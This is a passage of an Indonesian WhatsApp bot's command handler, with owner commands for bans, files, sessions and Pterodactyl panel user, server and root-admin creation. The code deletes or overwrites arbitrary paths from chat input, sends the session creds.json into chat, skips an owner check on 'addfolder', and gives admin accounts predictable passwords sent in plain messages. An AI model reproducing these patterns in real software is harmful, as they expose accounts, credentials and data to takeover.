                    if (!isBane) return reply('*Pengguna Ini Telah Di hapus Dari Ban*')
                    let delbans = banned.indexOf(orgnye)
                    banned.splice(delbans, 1)
                    reply(`*Berhasil Menghapus Pengguna yang Di Ban*`)
                } else {
                    reply("Error")
                }
            }
            break
            case 'listban':
                if (isBan) return reply('*Lu Di Ban Owner*')
                teksooop = `*List Ban*\n\n`
                for (let ii of banned) {
                    teksooop += `- ${ii}\n`
                }
                reply(teksooop)
                break
            case 'readchange':
            case 'autoread': {
                if (!isCreator) return reply(mess.owner)
                if (args.length < 1) return reply(`Contoh ${prefix + command} on/off`)
                if (q === 'on') {
                    global.autoread = true
                    reply(`Berhasil mengubah autoread ke ${q}`)
                } else if (q === 'off') {
                    global.autoread = false
                    reply(`Berhasil mengubah autoread ke ${q}`)
                }
            }
            break
            case 'setppbot': {
                if (!isCreator) return reply(mess.owner)
                if (m.quoted) {
                    const media = await zuu.downloadAndSaveMediaMessage(quoted)
                    const {
                        img
                    } = await generateProfilePicture(media)
                    await zuu.query({
                        tag: 'iq',
                        attrs: {
                            to: botNumber,
                            type: 'set',
                            xmlns: 'w:profile:picture'
                        },
                        content: [{
                            tag: 'picture',
                            attrs: {
                                type: 'image'
                            },
                            content: img
                        }]
                    })
                    await reply(`Done`)
                } else reply("Reply fotonya")
            }
            break
            case 'delppbot': {
                if (!isCreator) return reply(mess.owner)
                zuu.removeProfilePicture(zuu.user.id)
                reply(mess.done)
            }
            break
            case 'setbiobot': {
                if (!isCreator) return reply(mess.owner)
                if (!q) return reply(`Kirim perintah ${prefix+command} nama\n\nContoh : ${command} K`)
                await zuu.updateProfileStatus(q)
                await reply(`Berhasil mengganti status bio ke *${q}*`)
            }
            break
            case "delfile":
                if (!isCreator) return reply(mess.owner)
                if (!text) return reply("Ex: .delfile ./lib/database/prem.json")
                fs.unlinkSync(text)
                reply("Done")
                break
            case 'addfolder':
                if (!text) return reply("Ex: .addfolder ./lib hologra")
                if (isJadibot) return reply("*ONLY FOR REAL OWNER*")
                const targetPath = args[0]
                const folderReq = args[1]
                const requestPath = path.join(targetPath, folderReq);
                try {
                    if (!fs.existsSync(targetPath)) {
                        reply(`Path target path "${targetPath}" contoh: ./lib`);
                        return;
                    }
                    if (fs.existsSync(requestPath)) {
                        reply(`Folder "${folderReq}" sudah ada di "${targetPath}"`);
                        return;
                    }
                    fs.mkdirSync(requestPath);
                    reply(`Folder "${folderReq}" berhasil dibuat di "${targetPath}" !`);
                } catch (error) {
                    cosole.log(error)
                }
                break
            case 'delfolder':
                if (!isCreator) return reply(mess.owner)
                if (isJadibot) return reply("*ONLY FOR REAL OWNER*")
                if (!text) return reply(`*Ex* : ${prefix + command} ./lib/session2`)
                rimraf.sync(`${text}`)
                reply(`Berhasil hapus folder ${q}`)
                break
            case 'gfl':
            case "gantifile": {
                if (!isCreator) return reply(mess.owner)
                if (isJadibot) return reply("*ONLY FOR REAL OWNER*")
                if (!text.includes("./")) return reply(`*Example* : ${prefix + command} ./package.json`)
                let files = fs.readdirSync(text.split(m.quoted.fileName)[0])
                if (!files.includes(m.quoted.fileName)) return reply("File not found")
                let media = await downloadContentFromMessage(m.quoted, "document")
                let buffer = Buffer.from([])
                for await (const chunk of media) {
                    buffer = Buffer.concat([buffer, chunk])
                }
                fs.writeFileSync(text, buffer)
                reply(`Mengupload`)
                await sleep(2000)
                reply(`Berhasil mengganti file ${q}`)
            }
            break
            case 'delsession':
            case 'clearsession': {
                if (!isCreator) return reply(mess.owner)
                if (isJadibot) return reply("*ONLY FOR REAL OWNER*")
                
                fs.readdir("./lib/system/session", async function(err, files) {
                    if (err) {
                        console.log('Unable to scan directory: ' + err);
                        return reply('Unable to scan directory: ' + err);
                    }
                    let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
                        item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
                    )
                    console.log(filteredArray.length);
                    let teks = `Bentar..`
                    if (filteredArray.length == 0) return reply(teks)
                    filteredArray.map(function(e, i) {
                        teks += (i + 1) + `. ${e}\n`
                    })


                    await filteredArray.forEach(function(file) {
                        fs.unlinkSync(`./lib/session/${file}`)
                    });
                    await sleep(2000)
                    reply("Sukses")
                });
            }
            break
            case 'getsession':
                if (!isCreator) return reply(mess.owner)
                if (isJadibot) return reply("*ONLY FOR REAL OWNER*")
                
                let sessionbot2 = fs.readFileSync('./lib/system/session/creds.json')
                zuu.sendMessage(m.chat, {
                    document: sessionbot2,
                    mimetype: 'application/json',
                    fileName: 'creds.json'
                }, {
                    quoted: fsaluran
                })
                break
            case "public":
                if (!isCreator) return reply(mess.owner)
                if (settingdb.public) return
                settingdb.public = true
                reply(mess.done)
                break

            case "self":
                if (!isCreator) return reply(mess.owner)
                if (!settingdb.public) return
                settingdb.public = false
                reply(mess.done)
                break
            case 'delete':
            case 'del': {
                if (!isCreator) return reply(mess.done)
                if (!m.quoted) return
                if (!m.quoted.isBaileys) return reply('The message was not sent by a bot!')
                zuu.sendMessage(m.chat, {
                    delete: {
                        remoteJid: m.chat,
                        fromMe: true,
                        id: m.quoted.id,
                        participant: m.quoted.sender
                    }
                })
            }
            break
            case 'getcase':
                if (!isCreator) return reply(mess.owner)
                if (isJadibot) return reply("*ONLY FOR REAL OWNER*")
                if (!q) return reply(`Contoh penggunaan: ${prefix+command} menu`)
                const getcase = (cases) => {
                    return "case " + `'${cases}'` + fs.readFileSync('./case.js').toString().split('case \'' + cases + '\'')[1].split("break")[0] + "break"
                }
                reply(`${getcase(q)}`)
                break
            case 'listprem': {
                zuu.sendMessage(m.chat, {
                    contacts: {
                        displayName: `${listprem.length} Kontak`,
                        contacts: list
                    },
                    contextInfo: {
                        forwardingScore: 9999999,
                        isForwarded: true,
                        mentionedJid: [m.sender],
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: global.idsaluran,
                            serverMessageId: null,
                            newsletterName: global.namesaluran
                        },
                    }
                }, {
                    quoted: fsaluran
                })
            }
            break
            case 'addowner': {
                if (!isCreator) return reply(mess.owner)
                if (isJadibot) return reply("*ONLY FOR REAL OWNER*")
                if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6831#####`)
                prem1 = text.replace(/[^0-9]/g, '')
                let cek1 = await zuu.onWhatsApp(prem1 + `@s.whatsapp.net`)
                if (cek1.length == 0) return (`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
                newowner.push(prem1)
                fs.writeFileSync('./lib/database/owner.json', JSON.stringify(newowner))
                reply(`*${prem1} Telah menjadi owner*`)
            }
            break
            case 'delowner': {
                if (!isCreator) return reply(mess.owner)
                if (isJadibot) return reply("*ONLY FOR REAL OWNER*")
                if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6831#####`)
                prem2 = text.replace(/[^0-9]/g, '')
                unp = newowner.indexOf(prem2)
                newowner.splice(unp, 1)
                fs.writeFileSync('./lib/database/owner.json', JSON.stringify(newowner))
                reply(`*${prem2} Tidak lagi Menjadi owner*`)
            }
            break
            case 'delcase': {
                if (!isCreator) return reply(mess.owner)
                if (isJadibot) return reply("*ONLY FOR REAL OWNER*")
                if (!text) return reply('Mana case yang ingin dihapus?');
                const namaFile = './case.js';
                const caseToDelete = `case '${text}':`;
                fs.readFile(namaFile, 'utf8', (err, data) => {
                    if (err) {
                        console.error('Terjadi kesalahan saat membaca file:', err);
                        return reply('Terjadi kesalahan saat membaca file.');
                    }
                    const posisiCase = data.indexOf(caseToDelete);
                    if (posisiCase === -1) {
                        return reply(`Case '${args}' tidak ditemukan dalam file.`);
                    }
                    const posisiBreak = data.indexOf('break;', posisiCase);
                    if (posisiBreak === -1) {
                        return reply('Tidak dapat menemukan "break;" setelah case yang ingin dihapus.');
                    }
                    const kodeBaruLengkap = data.slice(0, posisiCase) + data.slice(posisiBreak + 'break;'.length);
                    fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
                        if (err) {
                            console.error('Terjadi kesalahan saat menulis file:', err);
                            return reply('Terjadi kesalahan saat menulis file.');
                        } else {
                            return reply(`Case '${text}' berhasil dihapus.`);
                        }
                    });
                });
            }
            break;
            case 'shutdown':
                if (!isCreator) return reply(mess.owner)
                if (isJadibot) return reply("*ONLY FOR REAL OWNER*")
                reply(`*Bye bye !*`)
                await sleep(3000)
                process.exit(1)
                break
            case 'restart':
                if (!isCreator) return reply(mess.owner)
                if (isJadibot) return reply("*ONLY FOR REAL OWNER*")
                const restart = async () => {
                    reply(mess.wait)
                }
                await restart()
                setTimeout(() => process.exit(), 2000)
                break
            case "addprem": {
                if (!isCreator) return reply(mess.owner)
                if (isJadibot) return reply("*ONLY FOR REAL OWNER*")
                
                if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285179836603`)
                prrkek = q.split("|")[0].replace(/[^0-9]/g, '') + `@s.whatsapp.net`
                let ceknya = await zuu.onWhatsApp(prrkek)
                if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
                prem.push(prrkek)
                fs.writeFileSync("./lib/database/premium.json", JSON.stringify(prem))
                reply(`Nomor ${prrkek} Telah Menjadi Premium!`)
            }
            break
            case "delprem": {
                if (!isCreator) return reply(mess.owner)
                if (isJadibot) return reply("*ONLY FOR REAL OWNER*")
                
                if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285179836603`)
                ya = q.split("|")[0].replace(/[^0-9]/g, '') + `@s.whatsapp.net`
                unp = prem.indexOf(ya)
                prem.splice(unp, 1)
                fs.writeFileSync("./lib/database/premium.json", JSON.stringify(prem))
                reply(`Nomor ${ya} Telah Di Hapus Premium!`)
            }
            break
            //=============[ CREATE - PANEL ]=================//        
            case "listsrv": {
                if (!isCreator) return reply(mess.owner)
                if (isJadibot) return reply("*ONLY FOR REAL OWNER*")
                
                let page = args[0] ? args[0] : '1';
                let f = await fetch(domain + "/api/application/servers?page=" + page, {
                    "method": "GET",
                    "headers": {
                        "Accept": "application/json",
                        "Content-Type": "application/json",
                        "Authorization": "Bearer " + apikey
                    }
                });
                let res = await f.json();
                let servers = res.data;
                let sections = [];
                let messageText = "Berikut adalah daftar server:\n\n";

                for (let server of servers) {
                    let s = server.attributes;

                    let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-` [0] + "/resources", {
                        "method": "GET",
                        "headers": {
                            "Accept": "application/json",
                            "Content-Type": "application/json",
                            "Authorization": "Bearer " + capikey
                        }
                    });

                    let data = await f3.json();
                    let status = data.attributes ? data.attributes.current_state : s.status;

                    messageText += `ID Server: ${s.id}\n`;
                    messageText += `Nama Server: ${s.name}\n`;
                    messageText += `Status: ${status}\n\n`;
                }

                messageText += `Halaman: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
                messageText += `Total Server: ${res.meta.pagination.count}`;

                await zuu.sendMessage(m.chat, {
                    text: messageText
                }, {
                    quoted: fsaluran
                });

                if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
                    reply(`Gunakan perintah .listsrv ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
                }
            }
            break;
            case "listusr": {
                if (!isCreator) return reply(mess.owner)
                if (isJadibot) return reply("*ONLY FOR REAL OWNER*")
                
                let page = args[0] ? args[0] : '1';
                let f = await fetch(domain + "/api/application/users?page=" + page, {
                    "method": "GET",
                    "headers": {
                        "Accept": "application/json",
                        "Content-Type": "application/json",
                        "Authorization": "Bearer " + apikey
                    }
                });
                let res = await f.json();
                let users = res.data;
                let messageText = "Berikut list user:\n\n";

                for (let user of users) {
                    let u = user.attributes;
                    messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
                    messageText += `${u.username}\n`;
                    messageText += `${u.first_name} ${u.last_name}\n\n`;
                }

                messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
                messageText += `Total Users: ${res.meta.pagination.count}`;

                await zuu.sendMessage(m.chat, {
                    text: messageText
                }, {
                    quoted: fsaluran
                });

                if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
                    reply(`Gunakan perintah .listusr ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
                }
            }
            break;
            case "delsrv": {
                if (!isCreator) return reply(mess.owner)
                if (isJadibot) return reply("*ONLY FOR REAL OWNER*")

                let srv = args[0]
                if (!srv) return reply('ID nya mana?')
                let f = await fetch(domain + "/api/application/servers/" + srv, {
                    "method": "DELETE",
                    "headers": {
                        "Accept": "application/json",
                        "Content-Type": "application/json",
                        "Authorization": "Bearer " + apikey,
                    }
                })
                let res = f.ok ? {
                    errors: null
                } : await f.json()
                if (res.errors) return reply('*SERVER NOT FOUND*')
                reply('*SUCCESSFULLY DELETE THE SERVER*')
            }
            break
            case "delusr": {
                if (!isCreator) return reply(mess.owner)
                let usr = args[0]
                if (!usr) return reply('ID nya mana?')
                let f = await fetch(domain + "/api/application/users/" + usr, {
                    "method": "DELETE",
                    "headers": {
                        "Accept": "application/json",
                        "Content-Type": "application/json",
                        "Authorization": "Bearer " + apikey
                    }
                })
                let res = f.ok ? {
                    errors: null
                } : await f.json()
                if (res.errors) return reply('*USER NOT FOUND*')
                reply('*SUCCESSFULLY DELETE THE USER*')
            }
            break
            case "addusr": {

                if (!isCreator) return reply(mess.owner)
                let t = text.split(',');
                if (t.length < 3) return reply(`*Format salah!*

Penggunaan:
${prefix + command} email,username,name,number/tag`);
                let email = t[0];
                let username = t[1];
                let name = t[2];
                let u = m.quoted ? m.quoted.sender : t[3] ? t[3].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
                if (!u) return reply(`*Format salah!*

Penggunaan:
${prefix + command} email,username,name,number/tag`);
                let d = (await zuu.onWhatsApp(u.split`@` [0]))[0] || {}
                let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
                let f = await fetch(domain + "/api/application/users", {
                    "method": "POST",
                    "headers": {
                        "Accept": "application/json",
                        "Content-Type": "application/json",
                        "Authorization": "Bearer " + apikey
                    },
                    "body": JSON.stringify({
                        "email": email,
                        "username": username,
                        "first_name": name,
                        "last_name": "Memb",
                        "language": "en",
                        "password": password.toString()
                    })
                })
                let data = await f.json();
                if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
                let user = data.attributes
                let p = await zuu.sendMessage(m.chat, {
                    text: `
*SUCCESSFULLY ADD USER*

╭─❏ *『 USER INFO 』*
┣❐ ➤ *ID* : ${user.id}
┣❏ ➤ *USERNAME* : ${user.username}
┣❏ ➤ *EMAIL* : ${user.email}
┣❏ ➤ *NAME* : ${user.first_name} ${user.last_name}
┣❏ ➤ *CREATED AT* :  ${tanggal}
┗⬣ *PASSWORD BERHASIL DI KIRIM KE @${u.split`@`[0]}*`,
                    mentions: [u],
                })
                zuu.sendMessage(u, {
                    text: `*BERIKUT DETAIL AKUN PANEL ANDA*\n
╭─❏ *『 USER INFO 』*
┣❏ ➤ *📧EMAIL* : ${email}
┣❏ ➤ *👤USERNAME* : ${username}
┣❏ ➤ *🔐PASSWORD* : ${password.toString()}
┣❏ ➤ *🌐LOGIN* : ${domain}
┗⬣`,
                })
            }
            break
            case "adminpanel": {
                if (!isCreator) return reply(mess.owner)
                if (isJadibot) return reply("*ONLY FOR REAL OWNER*")
                
                let s = q.split(',')
                let email = s[0];
                let username = s[0]
                let nomor = s[1]
                if (s.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
                if (!username) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
                if (!nomor) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
                let password = username + "0247"
                let nomornya = nomor.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                let f = await fetch(domain + "/api/application/users", {
                    "method": "POST",
                    "headers": {
                        "Accept": "application/json",
                        "Content-Type": "application/json",
                        "Authorization": "Bearer " + apikey
                    },
                    "body": JSON.stringify({
                        "email": username + "@gmail.com",
                        "username": username,
                        "first_name": username,
                        "last_name": "Memb",
                        "language": "en",
                        "root_admin": true,
                        "password": password.toString()
                    })

                })

                let data = await f.json();

                if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));

                let user = data.attributes

                let tks = `
TYPE: USER

ID: ${user.id}
USERNAME: ${user.username}
EMAIL: ${user.email}
NAME: ${user.first_name} ${user.last_name}
CREATED AT: ${user.created_at}
`
                const listMessage = {

                    text: tks,

                }



                await zuu.sendMessage(m.chat, listMessage)

                await zuu.sendMessage(nomornya, {

                    text: `*DETAIL AKUN ADMIN  PANEL ANDA*


╭─❏ *『 USER INFO 』*
┣❏ ➤ *👤USERNAME* : ${username}
┣❏ ➤ *🔐PASSWORD* : ${password}
┣❏ ➤ *🌐LOGIN* : ${domain}
┗⬣

_*Rules :*_
*- Jangan Hapus Akun Admin Lain*
*- Jangan Colong SC Buyer panel*
*- Jangan membuat Panel Terlalu besar*
*- Jangan Share Akun Admin Panel Kalian*
*- Jangan Membuat Akun Admin Panel Lain*
*- Jangan Open Reseller Panel*
*- Jangan Otak Atik Server Panel*
*- Jangan Give Away Panel*
*Melanggar Salah Satu Rules Di Atas Langsung Di Hapus Admin Panel Nya*
_*mohon ikuti rules nya*_
`,

                })
            }
            break
            case "listadmin": {
            if (isJadibot) return reply("*ONLY FOR REAL OWNER*")
                if (!isCreator) return reply(mess.owner)
                let page = args[0] ? args[0] : '1';
                let f = await fetch(domain + "/api/application/users?page=" + page, {
                    "method": "GET",
                    "headers": {
                        "Accept": "application/json",
                        "Content-Type": "application/json",
                        "Authorization": "Bearer " + apikey
                    }
                });
                let res = await f.json();
                let users = res.data;
                let messageText = "Berikut list admin:\n\n";

                for (let user of users) {
                    let u = user.attributes;
                    if (u.root_admin) {
                        messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
                        messageText += `${u.username}\n`;
                        messageText += `${u.first_name} ${u.last_name}\n\n`;
                    }
                }

                messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
                messageText += `Total Admin: ${res.meta.pagination.count}`;

                await zuu.sendMessage(m.chat, {
                    text: messageText
                }, {
                    quoted: fsaluran
                });

                if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
                    reply(`Gunakan perintah .listusr ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
                }
            }
            break;
            case "addsrv": {
            if (isJadibot) return reply("*ONLY FOR REAL OWNER*")
            if (!isPremium) return reply(mess.premium)
                let s = text.split(',');
                if (s.length < 7) return reply(`*Format salah!*

Penggunaan:
${prefix + command} name,tanggal,userId,eggId,locationId,memory/disk,cpu`)
                let name = s[0];
                let desc = s[1] || ''
                let usr_id = s[2];
                let egg = s[3];
                let loc = s[4];
                let memo_disk = s[5].split`/`;
                let cpu = s[6];
                let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
                    "method": "GET",
                    "headers": {
                        "Accept": "application/json",
                        "Content-Type": "application/json",
                        "Authorization": "Bearer " + apikey
                    }
                })
                let data = await f1.json();
                let startup_cmd = data.attributes.startup

                let f = await fetch(domain + "/api/application/servers", {
                    "method": "POST",
                    "headers": {
                        "Accept": "application/json",
                        "Content-Type": "application/json",
                        "Authorization": "Bearer " + apikey,
                    },
                    "body": JSON.stringify({
                        "name": name,
                        "description": desc,
                        "user": usr_id,
                        "egg": parseInt(egg),
                        "docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
                        "startup": startup_cmd,
                        "environment": {
                            "INST": "npm",
                            "USER_UPLOAD": "0",
                            "AUTO_UPDATE": "0",
                            "CMD_RUN": "npm start"
                        },
                        "limits": {
                            "memory": memo_disk[0],
                            "swap": 0,
                            "disk": memo_disk[1],
                            "io": 500,
                            "cpu": cpu
                        },
                        "feature_limits": {
                            "databases": 5,
                            "backups": 5,
                            "allocations": 5
                        },
                        deploy: {
                            locations: [parseInt(loc)],
                            dedicated_ip: false,
                            port_range: [],
                        },
                    })
                })
                let res = await f.json()
                if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
                let server = res.attributes
                reply(`*SUCCESSFULLY ADD SERVER*

TYPE: ${res.object}

ID: ${server.id}
UUID: ${server.uuid}
NAME: ${server.name}
DESCRIPTION: ${server.description}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%
CREATED AT: ${server.created_at}`)
            }
            break

            case "1gb":
            case "2gb":
            case "3gb":
            case "4gb":
            case "5gb":
            case "6gb":
            case "7gb":
            case "8gb":
            case "9gb":
            case "10gb":
            case "11gb":
            case "12gb":
            case "13gb":
            case "14gb":
            case "15gb":
            case "16gb":
            case "17gb":
            case "18gb":
            case "19gb":
            case "20gb":
            case "21gb":
            case "22gb":
            case "23gb":
            case "24gb":
            case "25gb":
            case "26gb":
            case "27gb":
            case "28gb":
            case "29gb":
            case "30gb":
            case "31gb":
            case "32gb":
            case "33gb":
            case "34gb":
            case "35gb":
            case "36gb":
            case "37gb":
            case "38gb":
            case "39gb":
            case "40gb":
            case "41gb":
            case "42gb":
            case "43gb":
            case "44gb":
            case "45gb":
            case "46gb":
            case "47gb":
            case "48gb":
            case "49gb":
            case "50gb":
            case "51gb":
            case "52gb":
            case "53gb":
            case "54gb":
            case "55gb":
            case "56gb":
            case "57gb":
            case "58gb":
            case "59gb":
            case "60gb":
            case "61gb":
            case "62gb":
            case "63gb":
            case "64gb":
            case "65gb":
            case "66gb":
            case "67gb":
            case "68gb":
            case "69gb":
            case "70gb":
            case "71gb":
            case "72gb":
            case "73gb":
            case "74gb":
            case "75gb":
            case "76gb":
            case "77gb":
            case "78gb":
            case "79gb":
            case "80gb":
            case "81gb":
            case "82gb":
            case "83gb":
            case "84gb":
            case "85gb":
            case "86gb":
            case "87gb":
            case "88gb":
            case "89gb":
            case "90gb":
            case "91gb":
            case "92gb":
            case "93gb":
            case "94gb":
            case "95gb":
            case "96gb":
            case "97gb":
            case "98gb":
            case "99gb":
            case "100gb":
            case "110gb":
            case "111gb":
            case "112gb":
            case "113gb":
            case "114gb":
            case "115gb":
            case "116gb":
            case "117gb":
            case "118gb":
            case "119gb":
            case "120gb":
            case "121gb":
            case "122gb":
            case "123gb":
            case "124gb":
            case "125gb":
            case "126gb":
            case "127gb":
            case "128gb":
            case "129gb":
            case "130gb":
            case "131gb":
            case "132gb":
            case "133gb":
            case "134gb":
            case "135gb":
            case "136gb":
            case "137gb":
            case "138gb":
            case "139gb":
            case "140gb":
            case "141gb":
            case "142gb":
            case "143gb":
            case "144gb":
            case "145gb":
            case "146gb":
            case "147gb":
            case "148gb":
            case "149gb":
            case "150gb":
            case "151gb":
            case "152gb":
            case "153gb":
            case "154gb":
            case "155gb":
            case "156gb":
            case "157gb":
            case "158gb":
            case "159gb":
            case "160gb":
            case "161gb":
            case "162gb":
            case "163gb":
            case "164gb":
            case "165gb":
            case "166gb":
            case "167gb":
            case "168gb":
            case "169gb":
            case "170gb":
            case "171gb":
            case "172gb":
            case "173gb":
            case "174gb":
            case "175gb":
            case "176gb":
            case "177gb":
            case "178gb":
            case "179gb":
            case "180gb":
            case "181gb":
            case "182gb":
            case "183gb":
            case "184gb":
            case "185gb":
            case "186gb":
            case "187gb":
            case "188gb":
            case "189gb":
            case "190gb":
            case "191gb":
            case "192gb":
            case "193gb":
            case "194gb":
            case "195gb":
            case "196gb":
            case "197gb":
            case "198gb":
            case "199gb":
            case "200gb":
            case "unli": {
                if (!isPremium) return reply(mess.premium)
                if (isJadibot) return reply("*ONLY FOR REAL OWNER*") 
                
                let t = text.split(',');
                if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
                let username = t[0];
                let u
                u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
                if (!u) {
                    u = m.chat
                }
                let name = username + "101"
                let egg = global.eggsnya
                let loc = global.location
                let memo
                let cpu
                let disk
                if (command === "unli") {
                    memo = 0
                    cpu = 0
                    disk = 0
                } else {
                    memo = spekpanel[command].memo
                    cpu = spekpanel[command].cpu
                    disk = spekpanel[command].disk
                }
                let email = username + "@OblivionX.md"
                akunlo = thumurl
                if (!u) return
                let d = (await zuu.onWhatsApp(u.split`@` [0]))[0] || {}
                let password = username + "#0011"
                let f = await fetch(domain + "/api/application/users", {
                    "method": "POST",
                    "headers": {
                        "Accept": "application/json",
                        "Content-Type": "application/json",
                        "Authorization": "Bearer " + apikey
                    },
                    "body": JSON.stringify({
                        "email": email,
                        "username": username,
                        "first_name": username,
                        "last_name": username,
                        "language": "en",
                        "password": password
                    })
                })
                let data = await f.json();
                if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
                let user = data.attributes
                let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
                    "method": "GET",
                    "headers": {
                        "Accept": "application/json",
                        "Content-Type": "application/json",
                        "Authorization": "Bearer " + apikey
                    }
                })
                reply(`*DONE CREATE USER + SERVER ID :* ${user.id}`)
                let data2 = await f2.json();
                let startup_cmd = data2.attributes.startup

                let f3 = await fetch(domain + "/api/application/servers", {
                    "method": "POST",
                    "headers": {
                        "Accept": "application/json",
                        "Content-Type": "application/json",
                        "Authorization": "Bearer " + apikey,
                    },
                    "body": JSON.stringify({
                        "name": name,
                        "description": " ",
                        "user": user.id,
                        "egg": parseInt(egg),
                        "docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
                        "startup": startup_cmd,
                        "environment": {
                            "INST": "npm",
                            "USER_UPLOAD": "0",
                            "AUTO_UPDATE": "0",
                            "CMD_RUN": "npm start"
                        },
                        "limits": {
                            "memory": memo,
                            "swap": 0,
                            "disk": disk,
                            "io": 500,
                            "cpu": cpu
                        },
                        "feature_limits": {
                            "databases": 5,
                            "backups": 5,
                            "allocations": 1
                        },
                        deploy: {
                            locations: [parseInt(loc)],
                            dedicated_ip: false,
                            port_range: [],
                        },
                    })
                })
                let res = await f3.json()
                if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
                let server = res.attributes
                ctf = `*${X}『 DATA AKUN PANEL ANDA 』${X}*

✦ *USERNAME* : ${user.username}
✦ *PASSWORD* : ${password}
✦ *LOGIN* : ${domain}

*===============================*
${readmore}
[𝟭] *CATAT DATA AKUN JANGAN SAMPE ILANG*
[𝟮] *JANGAN SEBAR WEB / AKUN PANEL*
[𝟯] *TIDAK MEMAKSA CPU LEBIH DARI BATAS*
`
                zuu.sendMessage(u, {
                    image: {
                        url: akunlo
                    },
                    caption: ctf
                }, {
                    quoted: zuu.chat
                })
            }
            break
            //=================================================//
            case 'closetime':
                if (!m.isGroup) return reply(mess.group)
                if (!isAdmins && !isCreator) return reply(mess.admin)
                if (!isBotAdmins) return reply(mess.botAdmin)
                if (args[1] == 'second') {
                    var timer = args[0] * `1000`
                } else if (args[1] == 'minute') {
                    var timer = args[0] * `60000`
                } else if (args[1] == 'hour') {
                    var timer = args[0] * `3600000`
                } else if (args[1] == 'day') {
                    var timer = args[0] * `86400000`
                } else {
                    return reply('*Choose:*\nsecond\nminute\nhour\nday\n\n*Example*\n10 second')
                }
                reply(`Close time ${q} starting from now`)
                setTimeout(() => {
                    var nomor = m.participant
                    const close = `*Closed* group closed by admin\nnow only admin can send messages`
                    zuu.groupSettingUpdate(m.chat, 'announcement')
                    reply(close)
                }, timer)
                break
            case 'opentime':
                if (!m.isGroup) return reply(mess.group)
                if (!isAdmins && !isCreator) return reply(mess.admin)
                if (!isBotAdmins) return reply(mess.botAdmin)
                if (args[1] == 'second') {
                    var timer = args[0] * `1000`
                } else if (args[1] == 'minute') {
                    var timer = args[0] * `60000`
                } else if (args[1] == 'hour') {
                    var timer = args[0] * `3600000`
                } else if (args[1] == 'day') {
                    var timer = args[0] * `86400000`
                } else {
                    return reply('*Choose:*\nsecond\nminute\nhour\nday\n\n*Example*\n10 second')
                }
                reply(`Open time ${q} starting from now`)
                setTimeout(() => {
                    var nomor = m.participant
                    const open = `*Opened* The group is opened by admin\nNow members can send messages`
                    zuu.groupSettingUpdate(m.chat, 'not_announcement')
                    reply(open)
                }, timer)
                break
            case 'setname':
            case 'setsubject':
                if (!m.isGroup) return reply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return reply(mess.admin)
                if (!isBotAdmins) return reply(mess.botAdmin)
                if (!text) return 'Text ?'
                await zuu.groupUpdateSubject(m.chat, text).then((res) => reply(mess.success)).catch((err) => reply(json(err)))
                break
            case 'setdesc':
            case 'setdesk':
                if (!m.isGroup) return reply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return reply(mess.admin)
                if (!isBotAdmins) return reply(mess.botAdmin)
                if (!text) return 'Text ?'
                await zuu.groupUpdateDescription(m.chat, text).then((res) => reply(mess.success)).catch((err) => reply(json(err)))
                break
            case 'setppgroup':
            case 'setppgrup':
            case 'setppgc':
                if (!m.isGroup) return reply(mess.group)
                if (!isAdmins) return reply(mess.admin)
                if (!isBotAdmins) return reply(mess.botAdmin)
                if (!quoted) return reply(`Send/Reply Image With Caption ${prefix + command}`)
                if (!/image/.test(mime)) return reply(`Send/Reply Image With Caption ${prefix + command}`)
                if (/webp/.test(mime)) return reply(`Send/Reply Image With Caption ${prefix + command}`)
                var medis = await zuu.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                if (args[0] == 'full') {
                    var {
                        img
                    } = await generateProfilePicture(medis)
                    await zuu.query({
                        tag: 'iq',
